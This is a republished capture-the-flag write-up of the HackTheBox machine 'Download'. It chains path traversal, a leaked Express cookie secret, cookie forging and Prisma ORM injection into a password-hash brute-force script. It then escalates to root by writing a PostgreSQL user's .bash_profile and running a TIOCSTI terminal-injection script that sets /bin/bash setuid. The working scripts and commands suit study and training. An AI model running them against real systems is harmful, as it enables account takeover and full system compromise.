# :globe_with_meridians: Download | LFI | ORM Injection | Teletypewriter (TTY) hijacking | PostgreSQL | NodeJS

> **Original Source:** [Download | LFI | ORM Injection | Teletypewriter (TTY) hijacking | PostgreSQL | NodeJS](https://infosecwriteups.com/download-lfi-orm-injection-teletypewriter-tty-hijacking-postgresql-c24122a2562a)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Download | LFI | ORM Injection | Teletypewriter (TTY) hijacking | PostgreSQL | NodeJS


*Download*


Here’s a summary of the key points of Download HTB machine:


Difficulty Level: HARD


Vulnerabilities and Techniques:


- LFR (Local File Read): The presence of a Local File Read vulnerability suggests that an attacker can read files on the system, potentially accessing sensitive information.

- ORM Injection: In an ORM injection attack, the attacker manipulates data inputs to deceive the ORM system and execute unintended database operations. This type of attack is similar in concept to SQL injection but targets the abstraction layer provided by the ORM.

- TTY (Teletypewriter) hijacking: This is a technique where an attacker simulates the typing of characters into the terminal, essentially pushing back input as if it were entered by the user.


Let’s add download.htb to our hosts file:

*hosts*Enumeration

>

nmap -sCV -p- — min-rate 10000 10.10.11.226


*nmap*


Two ports are open:80,22. let’s open port 80:


we can upload a file through upload module.


*upload file*


Let’s perform directory fuzzing using Gobuster to discover any directories:

>

feroxbuster -u http://download.htb


*Directory fuzing*


Nothing fancy.


let’s scan for additional subdomains:


```
ffuf -w /usr/share/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u http://download.htb -H "Host: FUZZ.download.htb" -mc all -fs 178
```


We can use the `-fs` flag to filter out HTTP responses based on their size. Specifically, weâ€™re filtering responses that have a size of 178 bytes to limit false positives. The `-mc` flag allows us to match specific HTTP status codes. By default, it matches status codes 200, 204, 301, 302, 307, 401, 403, 405, and 500.


*subdomain fuzzing*


Let’s register an account and log in to the web application:


*register*


*log in requet*


Let’s upload a file:


After uploading our file, three options are displayed: download, copy link, and delete. here are the download and view requests:


*download request*


The file is being downloaded using its UUID.


*copy link request*


The file is being displayed using its UUID.


download_session is a base64 cookie. here is the decoded value of it:


```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo 'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiaGFja3RoZWJveCJ9fQ==' | base64 -d
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"hackthebox"}}
```


*decode cookie value*


The cookie holds important information such as the username, id, and flashes field.


Let’s log out, go to the upload page, try to upload a file, and send the request:


*request*


Decode the value of the ‘download_session’ cookie.


```
echo -n 'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6bnVsbH0=' | base64 -d
{"flashes":{"info":[],"error":[],"success":[]},"user":null}
```


If we compare requests with login credentials and no login credentials, the download_session.sig value length is 27 bytes in both of them.


I attempted to create another user with a different username and tried to impersonate them by modifying our cookie. The ‘download_session.sig’ part remains the same. However, the response simply redirects us to the login page because the cookie isn’t valid.


Returning to the download request, what would happen if we attempted LFI (Local File Inclusion)? Let’s try to read /etc/passwd:


It doesn’t work. Even if we URL-encode ‘/’, it still doesn’t work


Let’s attempt to discover the directory where our uploaded files are being stored. I have tried some common names such as ‘upload’, ‘uploads’, and ‘files’. The one that proved successful was ‘uploads’:


```
GET /files/download/..%2fuploads%2fff7cfa80-cb36-4531-867c-8feb353fc383

```


Considering that the website is constructed with Express, let’s attempt to list some files, such as the ‘package.json’ file


```
{
"name": "download.htb",
"version": "1.0.0",
"description": "",
"main": "app.js",
"scripts": {
"test": "echo \"Error: no test specified\" && exit 1",
"dev": "nodemon --exec ts-node --files ./src/app.ts",
"build": "tsc"
},
"keywords": [],
"author": "wesley",
"license": "ISC",
"dependencies": {
"@prisma/client": "^4.13.0",
"cookie-parser": "^1.4.6",
"cookie-session": "^2.0.0",
"express": "^4.18.2",
"express-fileupload": "^1.4.0",
"zod": "^3.21.4"
},
"devDependencies": {
"@types/cookie-parser": "^1.4.3",
"@types/cookie-session": "^2.0.44",
"@types/express": "^4.17.17",
"@types/express-fileupload": "^1.4.1",
"@types/node": "^18.15.12",
"@types/nunjucks": "^3.2.2",
"nodemon": "^2.0.22",
"nunjucks": "^3.2.4",
"prisma": "^4.13.0",
"ts-node": "^10.9.1",
"typescript": "^5.0.4"
}
}
```


We can find all dependencies that the app is using in the ‘package.json’ file. It also reveals an author named WESLEY, which could potentially be a system username — *a valuable piece of information to keep in mind*. Additionally, the main script of the website is disclosed as ‘app.js’.


Additionally, it utilizes ‘Prisma’ which is an ORM for interacting with the database.

>

Object-Relational Mapping (ORM) frameworks help prevent SQL injection by handling the translation of higher-level, object-oriented code into SQL queries. SQL injection occurs when an attacker manipulates user inputs to inject malicious SQL code into the queries executed by a database. ORM frameworks provide a layer of abstraction that can help mitigate the risk of SQL injection in the following ways:


Parameterized Queries: ORM frameworks typically use parameterized queries, where user inputs are treated as parameters rather than being directly embedded into the SQL statement. Parameters are then securely bound to the query, preventing malicious manipulation of the SQL code.


Query Generation: ORM frameworks often generate SQL queries dynamically based on the object-oriented code. This process is handled internally by the ORM, reducing the likelihood of manual, error-prone query construction that could lead to SQL injection vulnerabilities.


Automatic Escaping: ORM frameworks often automatically escape special characters in user inputs. This ensures that even if user inputs contain characters that have special meanings in SQL (such as single quotes), the ORM will handle their proper escaping.


So ORM frameworks manage the mapping of objects to database tables, handle queries and updates, and provide a cohesive way to interact with the database using object-oriented principles.


Let’s attempt to list the content of app.js:


*app.js-1*


*app.js-2*


```

"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const nunjucks_1 = __importDefault(require("nunjucks"));
const path_1 = __importDefault(require("path"));
const cookie_parser_1 = __importDefault(require("cookie-parser"));
const cookie_session_1 = __importDefault(require("cookie-session"));
const flash_1 = __importDefault(require("./middleware/flash"));
const auth_1 = __importDefault(require("./routers/auth"));
const files_1 = __importDefault(require("./routers/files"));
const home_1 = __importDefault(require("./routers/home"));
const client_1 = require("@prisma/client");
const app = (0, express_1.default)();
const port = 3000;
const client = new client_1.PrismaClient();
const env = nunjucks_1.default.configure(path_1.default.join(__dirname, "views"), {
autoescape: true,
express: app,
noCache: true,
});
app.use((0, cookie_session_1.default)({
name: "download_session",
keys: ["8929874489719802418902487651347865819634518936754"],
maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.use(flash_1.default);
app.use(express_1.default.urlencoded({ extended: false }));
app.use((0, cookie_parser_1.default)());
app.use("/static", express_1.default.static(path_1.default.join(__dirname, "static")));
app.get("/", (req, res) => {
res.render("index.njk");
});
app.use("/files", files_1.default);
app.use("/auth", auth_1.default);
app.use("/home", home_1.default);
app.use("*", (req, res) => {
res.render("error.njk", { statusCode: 404 });
});
app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0", () => {
console.log("Listening on ", port);
if (process.env.NODE_ENV === "production") {
setTimeout(async () => {
await client.$executeRawUnsafe(`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);
}, 300000);
}
});
```


This is the main code for the website. It shows other paths to different scripts and files. Importantly, it includes the secret for signing cookies. This could help find new users, as this key is likely crucial for cookie signing.


home.js:


```

"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const express_1 = __importDefault(require("express"));
const auth_1 = __importDefault(require("../middleware/auth"));
const client = new client_1.PrismaClient();
const router = express_1.default.Router();
router.get("/", auth_1.default, async (req, res) => {
const files = await client.file.findMany({
where: { author: req.session.user },
select: {
id: true,
uploadedAt: true,
size: true,
name: true,
private: true,
authorId: true,
author: {
select: {
username: true,
},
},
},
});
res.render("home.njk", { files });
});
exports.default = router;
```


This code defines an Express route that, when accessed, queries a database for files associated with the currently authenticated user and renders an HTML view with the retrieved files. The `auth` middleware is likely used to ensure that only authenticated users can access this route.


Auth.js


```


"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const express_1 = __importDefault(require("express"));
const zod_1 = __importDefault(require("zod"));
const node_crypto_1 = __importDefault(require("node:crypto"));
const router = express_1.default.Router();
const client = new client_1.PrismaClient();
const hashPassword = (password) => {
return node_crypto_1.default.createHash("md5").update(password).digest("hex");
};
const LoginValidator = zod_1.default.object({
username: zod_1.default.string().min(6).max(64),
password: zod_1.default.string().min(6).max(64),
});
router.get("/login", (req, res) => {
res.render("login.njk");
});
router.post("/login", async (req, res) => {
const result = LoginValidator.safeParse(req.body);
if (!result.success) {
res.flash("error", "Your login details were invalid, please try again.");
return res.redirect("/auth/login");
}
const data = result.data;
const user = await client.user.findFirst({
where: { username: data.username, password: hashPassword(data.password) },
});
if (!user) {
res.flash("error", "That username / password combination did not exist.");
return res.redirect("/auth/register");
}
req.session.user = {
id: user.id,
username: user.username,
};
res.flash("success", "You are now logged in.");
return res.redirect("/home/");
});
router.get("/register", (req, res) => {
res.render("register.njk");
});
const RegisterValidator = zod_1.default.object({
username: zod_1.default.string().min(6).max(64),
password: zod_1.default.string().min(6).max(64),
});
router.post("/register", async (req, res) => {
const result = RegisterValidator.safeParse(req.body);
if (!result.success) {
res.flash("error", "Your registration details were invalid, please try again.");
return res.redirect("/auth/register");
}
const data = result.data;
const existingUser = await client.user.findFirst({
where: { username: data.username },
});
if (existingUser) {
res.flash("error", "There is already a user with that email address or username.");
return res.redirect("/auth/register");
}
await client.user.create({
data: {
username: data.username,
password: hashPassword(data.password),
},
});
res.flash("success", "Your account has been registered.");
return res.redirect("/auth/login");
});
router.get("/logout", (req, res) => {
if (req.session)
req.session.user = null;
res.flash("success", "You have been successfully logged out.");
return res.redirect("/auth/login");
});
exports.default = router;
```


This code defines routes for user authentication (login, logout) and registration. It integrates Zod for input validation, Prisma for database interactions, and Express for routing in a Node.js web application.

## Forge Cookie


With the tool [cookie-monster](https://github.com/DigitalInterruption/cookie-monster), we can generate and sign new cookies with the desired information. That is a utility for automating the testing and re-signing of Express.js cookie secrets.


## Get Aydin Naserifard’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


We need to save our cookie in JSON format in a JSON file:


```
cat alteredcookie.json
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"hackthebox"}}
```


Now I will sign it using ‘cookie-monster’:


```
cookie-monster -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f alteredcookie.json
_ _
_/0\/ \_
.-. .-` \_/\0/ '-.
/:::\ / ,_________, \
/\:::/ \ '. (:::/ `'-;
\ `-'`\ '._ `"'"'\__ \
`'-. \ `)-=-=( `, |
\ `-"` `"-` /

[+] Data Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiaGFja3RoZWJveCJ9fQ==
[+] Signature Cookie: download_session.sig=GprO4Fw-v9zirJVAjAhW3YZvUQE
```


*cookie-monster*


As you can see, the generated values with the *cookie-monster* utility are the same as our real cookies.

>

ORM Injection


let’s change the id to 1 and username to wesley:


```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat alteredcookie.json
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":1,"username":"wesley"}}

┌──(kali㉿kali)-[~/Desktop]
└─$ /home/kali/.npm-global/bin/cookie-monster -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f alteredcookie.json
_ _
_/0\/ \_
.-. .-` \_/\0/ '-.
/:::\ / ,_________, \
/\:::/ \ '. (:::/ `'-;
\ `-'`\ '._ `"'"'\__ \
`'-. \ `)-=-=( `, |
\ `-"` `"-` /

[+] Data Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MSwidXNlcm5hbWUiOiJ3ZXNsZXkifX0=
[+] Signature Cookie: download_session.sig=qQxQdv3ZjZbAddoDzP0zXSakQcI

┌──(kali㉿kali)-[~/Desktop]
└─$
```


Let’s replace our old cookies with the newly generated cookies and navigate to the home page. As you can see, it works correctly and displays the Wesley username, but without any uploaded files. I think this is related to the corresponding username with the ID.


So, what occurs if I submit the cookie with an id=1 and no username?


```
──(kali㉿kali)-[~/Desktop]
└─$ cat alteredcookie.json
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":1}}

┌──(kali㉿kali)-[~/Desktop]
└─$ /home/kali/.npm-global/bin/cookie-monster -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f alteredcookie.json
_ _
_/0\/ \_
.-. .-` \_/\0/ '-.
/:::\ / ,_________, \
/\:::/ \ '. (:::/ `'-;
\ `-'`\ '._ `"'"'\__ \
`'-. \ `)-=-=( `, |
\ `-"` `"-` /

[+] Data Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MX19
[+] Signature Cookie: download_session.sig=L-CbUTci83X7NoHNhIVqKhBCSDg

┌──(kali㉿kali)-[~/Desktop]
└─$
```


I am now observing files from user named WESLEY, indicating a successful impersonation of his account.


Let’s see what happens if we leave the user field empty:


```
┌──(kali㉿kali)-[~/Desktop]
└─$ /home/kali/.npm-global/bin/cookie-monster -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f alteredcookie.json
_ _
_/0\/ \_
.-. .-` \_/\0/ '-.
/:::\ / ,_________, \
/\:::/ \ '. (:::/ `'-;
\ `-'`\ '._ `"'"'\__ \
`'-. \ `)-=-=( `, |
\ `-"` `"-` /

[+] Data Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6e319
[+] Signature Cookie: download_session.sig=RdmrvnrBpzrS3slS77uG7Cuiv-Q
```


There are numerous new users, and we can access all users’ files.

>

Since the website uses Prisma Client to talk to the database, I started thinking about the chance of something called ORM injection through cookies.


In simple terms, ORM (which is just a way to handle databases) usually builds queries using specific methods. But, if the website doesn’t check or clean the information it gets from users before using it in these queries, we might be able to change some things and make the system do things it shouldn’t, even harmful stuff in the database.


After going through [Prisma documentation](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference), I discovered some functions we can use to get data from the database.


Although these functions are not specifically designed for data extraction, we can cleverly use some of them to gather information from the database.


Out of the many functions, I found one that caught my interest for experimentation. It’s called startsWith. This function checks and compares a character provided as an argument during the execution of the SQL query. If that works here, we can use that to brute force the password character by character.


To illustrate, we will conduct a test to try accessing files uploaded by all users whose usernames begin with the character “A”.


```
──(kali㉿kali)-[~/Desktop]
└─$ cat alteredcookie.json
{"flashes":{"info":[],"error":[],"success":[]},"user":{"username":{"startsWith":"A"}}}

┌──(kali㉿kali)-[~/Desktop]
└─$ /home/kali/.npm-global/bin/cookie-monster -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f alteredcookie.json
_ _
_/0\/ \_
.-. .-` \_/\0/ '-.
/:::\ / ,_________, \
/\:::/ \ '. (:::/ `'-;
\ `-'`\ '._ `"'"'\__ \
`'-. \ `)-=-=( `, |
\ `-"` `"-` /

[+] Data Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJ1c2VybmFtZSI6eyJzdGFydHNXaXRoIjoiQSJ9fX0=
[+] Signature Cookie: download_session.sig=bI89MIMG1P226_VRwmajlBlSroA
```


Now, we can see files uploaded by users whose usernames begin with the character ‘A’.


we can extract passwords using brute-force attack. As we noticed, the user WESLEY was mentioned as the author in the package.json file. It could be worthwhile to attempt extracting his password.


Brute-force Script:


```
import requests
import json
import subprocess

password = ''
chars = "abcdef0123456789"

def generate(c):
query = {"user": {"username": {"contains": "WESLEY"}, "password": {"startsWith": password + c}}}
with open("tempcookie.json", "w") as f:
f.write(json.dumps(query))

output = subprocess.check_output([
"/home/kali/.npm-global/bin/cookie-monster",
"-e", "-f", "tempcookie.json",
"-k", "8929874489719802418902487651347865819634518936754",
"-n", "download_session"
]).decode().replace("\n", " ")

jwt = output.split("download_session=")[1].split(" ")[0].split("\x1b")[0]
sig = output.split("download_session.sig=")[1].split("\x1b")[0]

return jwt, sig

for i in range(32):
for c in chars:
test = password + c
jwt, sig = generate(c)
cookie = {"download_session": jwt, "download_session.sig": sig}
r = requests.get('http://download.htb/home/', cookies=cookie)

if len(r.text) != 2174:
print(f"Found char: {c}")
password += c
print(password)
break

print(password)
```


why chars = “abcdef0123456789”?


According to the auth.js file: The `hashPassword` function takes a `password` as input, applies the MD5 hashing algorithm using the `crypto` module, and returns the resulting hash as a 32-character hexadecimal string. In the login route, the `hashPassword` function is used to hash the provided password before querying the database. If a user with the given username and hashed password is found, it implies that the password in the database matches the hashed input. The characters consist of ‘a’ to ‘f’ in the alphabet and ‘0’ to ‘9 in digits.


```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 brute2.py
Found char: f
f
Found char: 8
f8
Found char: 8
f88
Found char: 9
f889
Found char: 7
f8897
Found char: 6
f88976
Found char: c
f88976c
Found char: 1
f88976c1
Found char: 0
f88976c10
Found char: a
f88976c10a
Found char: f
f88976c10af
Found char: 6
f88976c10af6
Found char: 6
f88976c10af66
Found char: 9
f88976c10af669
Found char: 1
f88976c10af6691
Found char: 5
f88976c10af66915
Found char: 9
f88976c10af669159
Found char: 1
f88976c10af6691591
Found char: 8
f88976c10af66915918
Found char: 9
f88976c10af669159189
Found char: 4
f88976c10af6691591894
Found char: 5
f88976c10af66915918945
Found char: b
f88976c10af66915918945b
Found char: 9
f88976c10af66915918945b9
Found char: 6
f88976c10af66915918945b96
Found char: 7
f88976c10af66915918945b967
Found char: 9
f88976c10af66915918945b9679
Found char: b
f88976c10af66915918945b9679b
Found char: 2
f88976c10af66915918945b9679b2
Found char: b
f88976c10af66915918945b9679b2b
Found char: d
f88976c10af66915918945b9679b2bd
Found char: 3
f88976c10af66915918945b9679b2bd3
f88976c10af66915918945b9679b2bd3
```


Let’s try to crack this hash using [crackstation](https://crackstation.net/): (wesley:dunkindonuts)


*crackstation*

## User Flag


With this, we can SSH into the machine as Wesley:


*user flag*


And we do get the user flag.

## Privilege Escalation


`netstat` indicates a service running on port 5432, which is the default port for PostgreSQL.


*netstat*


Let’s take a look at the Set-UID and Set-GID files

*Set-UID and Set-GID files*


There are no interesting files that we could abuse.


I intend to upload pspy to the victim machine for inspecting and examining processes and commands running on the system.

*scp*


*pspy*


*pspy*


The root user is verifying the status of both the PostgreSQL service and the download-site service. The download-site service seems to be a custom service on the machine, making it worthwhile to investigate.


By checking the service configuration file found, we can find hardcoded credentials within it:


*download-site.service*


Let’s attempt to log in to the download database and interact with it:


show databases:


*postgreSQL*


show tables:


*tables*


show columns of a table:


*columns*


By checking our permissions, we can see that we have the `pg_write_server_files` privilege.


*permissions*


By examining the user’s shell, we can observe that it is set to /bin/bash

*bash*


Let’s try to attempt to make


*copy command*


We do receive a connection back in our Python web server:

*connect back*

## TTY Hijacking


From the pspy output, we noticed that the root user switches to the postgres user. This creates an issue because, having access to the postgres user, we can exploit TTY hijacking to potentially gain root access. For a detailed guide on this, you can refer to this [link](https://www.errno.fr/TTYPushback.html).


Now, our goal is to craft an exploit. This exploit aims to obtain a copy of the root’s bash binary with root-level permissions. The command sequence is attempting to set the setuid bit (`u+s`) on the `/bin/bash` executable. This would make `/bin/bash` a setuid executable, allowing us to get root privileges.


*pspy*Exploit Code:

>

This Python script, is designed to simulate manual command entry into the terminal using the ioctl system call with the TIOCSTI request, allowing the injection of characters into the terminal input queue. The command_sequence variable holds the specific commands exit and /bin/bash -c ‘chmod u+s /bin/bash’. The script iterates through each character in the command sequence, attempting to inject it into the terminal using ioctl, and printing an error message if the injection fails. When executed as the main program, this script serves the purpose of automating the input of predetermined commands into the terminal.


```
import fcntl
import os
import termios

def inject_commands():
command_sequence = "exit\n/bin/bash -c 'chmod u+s /bin/bash'\n"

for char in command_sequence:
try:
ret = fcntl.ioctl(0, termios.TIOCSTI, char)
if ret == -1:
print("Error: ioctl()")
except OSError as e:
print(f"Error: ioctl() - {e}")

if __name__ == "__main__":
inject_commands()
```


>

`TIOCSTI:` It's an ioctl (input/output control) request used to simulate the typing of characters into the terminal. When this ioctl is called, it pushes a single character back into the input queue of the terminal. This can be used for injecting input as if it were typed by a user.


In the script, the `fcntl.ioctl(0, termios.TIOCSTI, char)` line attempts to inject each character of the command string into the terminal's input queue. This is a technique often used in scenarios like TTY hijacking, where an attacker wants to control the terminal input to execute specific commands.


Let’s write our exploit.py to the .bash_profile of the PostgreSQL:


```
download=> COPY (SELECT 'python3 /dev/shm/exploit.py') TO '/var/lib/postgresql/.bash_profile';
COPY 1
download=> quit
```


Now, We can run ‘bash -p’ to run commands as the root user:


*root flag*

---

*Originally published on [Medium](https://infosecwriteups.com/download-lfi-orm-injection-teletypewriter-tty-hijacking-postgresql-c24122a2562a). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
